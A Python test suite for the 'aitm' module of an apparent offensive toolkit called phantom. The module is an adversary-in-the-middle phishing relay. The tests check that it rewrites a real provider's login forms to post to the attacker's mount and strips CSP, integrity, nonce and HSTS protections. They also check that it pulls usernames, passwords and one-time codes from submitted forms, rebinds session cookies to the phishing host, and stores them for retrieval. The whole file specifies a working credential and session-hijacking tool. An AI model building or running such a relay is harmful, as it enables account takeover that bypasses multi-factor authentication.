"""Tests for the AiTM relay: page rewriting, form/credential parsing, cookie
relaying, the AuthProxy state machine and the tracker mount. No test leaves the
machine — the upstream hop is always an injected fetcher."""
import unittest
import urllib.error
import urllib.parse
import urllib.request

from phantom.automation.social import aitm
from phantom.automation.social.aitm import (
    AuthProxy,
    capture_form,
    mount_root,
    pick_credentials,
    relay_cookie,
    rewrite_html,
)


class TestRewriteHtml(unittest.TestCase):

    def test_form_action_is_repointed_at_the_mount(self):
        html = '<form method="post" action="https://login.example.com/auth">x</form>'
        out = rewrite_html(html, "https://login.example.com/", "abc")
        self.assertIn('action="/a/abc/p"', out)
        self.assertNotIn("login.example.com/auth", out)

    def test_form_without_action_gets_one_injected(self):
        # very common IdP shape: the form posts to itself. Without an injected
        # action the credentials go straight to the provider and we get nothing.
        out = rewrite_html('<form method="post">x</form>',
                           "https://login.example.com/", "abc")
        self.assertIn('<form action="/a/abc/p"', out)

    def test_base_csp_and_integrity_are_stripped(self):
        html = ('<head><base href="https://login.example.com/">'
                '<meta http-equiv="Content-Security-Policy" content="default-src none">'
                '<script src="/a.js" integrity="sha256-x" crossorigin="anonymous" nonce="n1"></script>'
                '</head>')
        out = rewrite_html(html, "https://login.example.com/", "abc")
        self.assertNotIn("<base", out)
        self.assertNotIn("content-security-policy", out.lower())
        self.assertNotIn("integrity", out)
        self.assertNotIn("crossorigin", out)
        self.assertNotIn("nonce", out)

    def test_absolute_provider_urls_become_mount_relative(self):
        html = '<a href="https://login.example.com/help">help</a>'
        out = rewrite_html(html, "https://login.example.com/", "abc")
        self.assertIn('href="/a/abc/help"', out)
        self.assertNotIn("https://login.example.com/help", out)

    def test_protocol_relative_rewritten_only_when_host_known(self):
        html = '<img src="//login.example.com/logo.png">'
        out = rewrite_html(html, "https://login.example.com/", "abc",
                           our_host="phish.test")
        self.assertIn("//phish.test/a/abc/logo.png", out)

    def test_empty_html_is_returned_as_is(self):
        self.assertEqual(rewrite_html("", "https://x/", "abc"), "")

    def test_mount_root_shape(self):
        self.assertEqual(mount_root("abc"), "/a/abc")


class TestCaptureForm(unittest.TestCase):

    def test_urlencoded(self):
        body = urllib.parse.urlencode({"loginfmt": "u@x.com", "passwd": "pw"})
        self.assertEqual(capture_form(body.encode(), "application/x-www-form-urlencoded"),
                         {"loginfmt": "u@x.com", "passwd": "pw"})

    def test_multipart_boundary_is_case_sensitive(self):
        # browsers emit mixed-case boundaries; lowercasing the header before
        # matching silently collapses the body into one unparseable field.
        b = "----WebKitFormBoundary7MA4YW"
        body = (f"--{b}\r\nContent-Disposition: form-data; name=\"loginfmt\"\r\n\r\nu@x.com\r\n"
                f"--{b}\r\nContent-Disposition: form-data; name=\"passwd\"\r\n\r\npw\r\n--{b}--")
        out = capture_form(body.encode(), f"multipart/form-data; boundary={b}")
        self.assertEqual(out, {"loginfmt": "u@x.com", "passwd": "pw"})

    def test_json_body(self):
        out = capture_form(b'{"username":"u@x.com","password":"pw","mfa":true}',
                           "application/json")
        self.assertEqual(out["username"], "u@x.com")
        self.assertEqual(out["password"], "pw")

    def test_json_garbage_does_not_raise(self):
        self.assertEqual(capture_form(b"{not json", "application/json"), {})

    def test_unknown_content_type_returns_empty(self):
        self.assertEqual(capture_form(b"\x00\x01binary", "application/octet-stream"), {})


class TestPickCredentials(unittest.TestCase):

    def test_specific_fields_beat_generic_ones(self):
        creds = pick_credentials({"loginfmt": "a@x.com", "username": "other",
                                  "passwd": "pw", "password": "nope"})
        self.assertEqual(creds["username"], "a@x.com")
        self.assertEqual(creds["password"], "pw")

    def test_substring_fallback_for_suffixed_names(self):
        creds = pick_credentials({"userNameField": "u@x.com",
                                  "passwordInput": "pw"})
        self.assertEqual(creds["username"], "u@x.com")
        self.assertEqual(creds["password"], "pw")

    def test_otp_detected(self):
        self.assertEqual(pick_credentials({"otc": "123456"})["otp"], "123456")

    def test_missing_fields_are_empty_strings(self):
        creds = pick_credentials({})
        self.assertEqual(creds, {"username": "", "password": "", "otp": ""})


class TestRelayCookie(unittest.TestCase):

    def test_domain_attribute_is_dropped(self):
        # the cookie must bind to OUR hostname, or the browser discards it
        out = relay_cookie("a=1; Domain=login.example.com; Path=/; HttpOnly")
        self.assertNotIn("Domain", out)
        self.assertIn("Path=/", out)
        self.assertIn("HttpOnly", out)

    def test_secure_is_kept_on_https_and_dropped_on_http(self):
        c = "a=1; Path=/; Secure; SameSite=None"
        self.assertIn("Secure", relay_cookie(c, secure=True))
        self.assertNotIn("Secure", relay_cookie(c, secure=False))

    def test_empty_cookie(self):
        self.assertEqual(relay_cookie(""), "")


class TestAuthProxy(unittest.TestCase):

    def _proxy(self, calls):
        def fetch(method, url, data=None, headers=None, timeout=20.0):
            calls.append((method, url, data, headers or {}))
            if method == "GET":
                return (200, [("Content-Type", "text/html; charset=utf-8")],
                        b'<body><form method="post"><input name="loginfmt">'
                        b'<input name="passwd"></form></body>')
            return (200, [("Content-Type", "text/html; charset=utf-8"),
                          ("Set-Cookie", "SID=abc; Path=/; Secure; Domain=login.example.com"),
                          ("Strict-Transport-Security", "max-age=1"),
                          ("Location", "/app")],
                    b"<html>ok</html>")
        captured = []
        p = AuthProxy("abc", "https://login.example.com/", fetcher=fetch,
                      sink=lambda kind, payload: captured.append((kind, payload)),
                      secure=False)
        return p, captured, calls

    def test_open_page_rewrites_and_passes_through(self):
        p, captured, calls = self._proxy([])
        status, headers, body = p.open_page("")
        self.assertEqual(status, 200)
        self.assertIn(b'action="/a/abc/p"', body)
        # provider security headers must not leak into our answer
        names = {k.lower() for k, _ in headers}
        self.assertNotIn("strict-transport-security", names)

    def test_submit_captures_credentials_and_session(self):
        p, captured, calls = self._proxy([])
        p.open_page("")
        body = urllib.parse.urlencode({"loginfmt": "v@corp.com", "passwd": "hunter2"})
        status, headers, out = p.submit(body.encode(),
                                        "application/x-www-form-urlencoded")
        self.assertEqual(status, 200)
        kinds = {k for k, _ in captured}
        self.assertEqual(kinds, {"creds", "session"})
        creds = dict(captured)["creds"]
        self.assertEqual(creds["username"], "v@corp.com")
        self.assertEqual(creds["password"], "hunter2")
        cookies = dict(captured)["session"]["cookies"]
        self.assertIn("SID=abc", cookies)
        self.assertNotIn("Domain", cookies)

    def test_default_fetch_maps_network_failure_to_502(self):
        # an unreachable provider is a normal answer, not an exception: the
        # relay must still reply (fail-soft) instead of killing the handler.
        status, headers, body = aitm.default_fetch(
            "GET", "http://127.0.0.1:1/never", timeout=0.5)
        self.assertEqual(status, 502)
        self.assertEqual(body, b"")

    def test_requires_absolute_upstream(self):
        with self.assertRaises(ValueError):
            AuthProxy("abc", "not-a-url")

    def test_requires_a_code(self):
        with self.assertRaises(ValueError):
            AuthProxy("", "https://login.example.com/")

    def test_enabled_is_a_bool_and_opt_in(self):
        self.assertIsInstance(aitm.enabled(), bool)

    def test_mount_prefix_is_per_code(self):
        self.assertEqual(aitm.mount_root("deadbeef"), "/a/deadbeef")


class TestTrackerAiTMMount(unittest.TestCase):
    """The mount in TrackingServer: /a/<code> and /a/<code>/p end to end."""

    def _server(self, aitm_on: bool = True):
        from phantom.automation.social import tracker

        def fetch(method, url, data=None, headers=None, timeout=20.0):
            if method == "GET":
                return (200, [("Content-Type", "text/html; charset=utf-8")],
                        b'<html><form method="post"><input name="loginfmt">'
                        b'<input name="passwd"></form></html>')
            return (200, [("Content-Type", "text/html; charset=utf-8"),
                          ("Set-Cookie", "SID=abc; Path=/; HttpOnly")],
                    b"<html>ok</html>")

        # the gate is read when the handler is BUILT (at start), so it must be
        # set before start() — exactly like the real opt-in config path.
        srv = tracker.TrackingServer(host="127.0.0.1", port=0, aitm=aitm_on)
        srv.register_aitm("abc", "https://login.example.com/", fetcher=fetch)
        srv.start()
        return srv

    @staticmethod
    def _base(srv) -> str:
        # port 0 asks the OS for a free port: read the one actually bound
        return f"http://127.0.0.1:{srv._httpd.server_address[1]}"

    def test_relay_records_creds_and_session(self):
        srv = self._server()
        base = self._base(srv)
        try:
            page = urllib.request.urlopen(base + "/a/abc").read().decode()
            self.assertIn('action="/a/abc/p"', page)
            body = urllib.parse.urlencode({"loginfmt": "v@corp.com", "passwd": "pw"})
            req = urllib.request.Request(
                base + "/a/abc/p", data=body.encode(),
                headers={"Content-Type": "application/x-www-form-urlencoded"})
            urllib.request.urlopen(req).read()
            creds = srv.store.creds("abc")
            sessions = srv.store.sessions("abc")
            self.assertEqual(creds[0].username, "v@corp.com")
            self.assertEqual(creds[0].password, "pw")
            self.assertIn("SID=abc", sessions[0].cookies)
        finally:
            srv.stop()

    def test_unmounted_code_answers_like_a_broken_endpoint(self):
        srv = self._server()
        base = self._base(srv)
        try:
            try:
                r = urllib.request.urlopen(base + "/a/unknown")
                status = r.status
            except urllib.error.HTTPError as e:
                status = e.code
            self.assertEqual(status, 502)
            self.assertEqual(srv.store.creds("unknown"), [])
        finally:
            srv.stop()

    def test_relay_off_still_decays(self):
        srv = self._server(aitm_on=False)
        base = self._base(srv)
        try:
            try:
                r = urllib.request.urlopen(base + "/a/abc")
                status = r.status
            except urllib.error.HTTPError as e:
                status = e.code
            self.assertEqual(status, 502)
        finally:
            srv.stop()


class TestCraftAiTM(unittest.TestCase):
    """The manual-core surface: opt-in gate, URL shape, session reader."""

    def test_usage_error_without_a_url(self):
        from phantom.modules import craft
        out = craft.craft_aitm("")
        self.assertIn("error", out)
        self.assertIn("aitm", out["error"].lower())

    def test_disabled_by_default_is_refused_with_a_way_to_enable(self):
        from unittest.mock import patch
        from phantom.modules import craft
        with patch("phantom.automation.social.aitm.enabled", return_value=False):
            out = craft.craft_aitm("https://login.example.com/")
        self.assertIn("error", out)
        self.assertIn("PHANTOM_AITM", out["hint"])
        self.assertIn("domain+tls", out["requires"])

    def test_mount_url_and_registration_when_enabled(self):
        from unittest.mock import patch
        from phantom.modules import craft

        registered = {}

        class FakeServer:
            def register_aitm(self, code, upstream):
                registered["code"] = code
                registered["upstream"] = upstream

        with patch("phantom.automation.social.aitm.enabled", return_value=True), \
                patch.object(craft, "_server", return_value=FakeServer()), \
                patch.object(craft, "_tracking_base",
                             return_value="https://t.example.com"):
            out = craft.craft_aitm("https://login.example.com/")
        self.assertNotIn("error", out)
        self.assertEqual(out["upstream"], "https://login.example.com/")
        self.assertEqual(out["url"], f"https://t.example.com/a/{out['code']}")
        self.assertEqual(registered["upstream"], "https://login.example.com/")
        self.assertEqual(registered["code"], out["code"])
        self.assertIn("fido2-passkeys", out["limits"])

    def test_sessions_reader_is_empty_safe(self):
        from unittest.mock import patch
        from phantom.modules import craft
        with patch.object(craft, "_store", return_value=None):
            self.assertEqual(craft.craft_sessions("abc"), {"sessions": []})

    def test_sessions_reader_serializes_rows(self):
        from unittest.mock import patch
        from phantom.modules import craft

        class Row:
            ip = "1.2.3.4"
            username = "v@corp.com"
            cookies = "SID=abc; Path=/"
            user_agent = "UA"
            time = "2026-01-01T00:00:00Z"

        class Store:
            def sessions(self, code):
                return [Row()]

        with patch.object(craft, "_store", return_value=Store()):
            out = craft.craft_sessions("abc")
        self.assertEqual(out["sessions"][0]["username"], "v@corp.com")
        self.assertIn("SID=abc", out["sessions"][0]["cookies"])

    def test_hits_payload_includes_sessions_key(self):
        from unittest.mock import patch
        from phantom.modules import craft

        class Store:
            def hits(self, code):
                return []

            def opens(self, code):
                return []

            def creds(self, code):
                return []

            def sessions(self, code):
                return []

        with patch.object(craft, "_store", return_value=Store()):
            out = craft.craft_hits("abc")
        self.assertEqual(out["sessions"], [])


if __name__ == "__main__":
    unittest.main()
